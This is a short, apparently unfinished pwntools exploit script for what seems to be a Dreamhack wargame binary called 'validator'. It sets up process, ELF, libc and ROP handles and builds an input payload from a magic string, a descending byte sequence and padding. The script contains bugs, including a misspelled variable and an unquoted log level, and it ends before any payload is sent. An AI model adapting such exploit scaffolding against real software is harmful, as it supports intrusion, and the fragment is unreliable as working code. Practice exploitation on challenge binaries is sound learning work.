from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


p = process("./validator")
e = ELF("./validator")
lbic = e.libc()
r = ROP(e)

context.log_level = debug
gdb.attach(p)




payload = b"DREAMHACK!"
list = []

for i in range(118, -1, -1):
        list.append(i)

payload += bytes(list)
payload += b"B"*7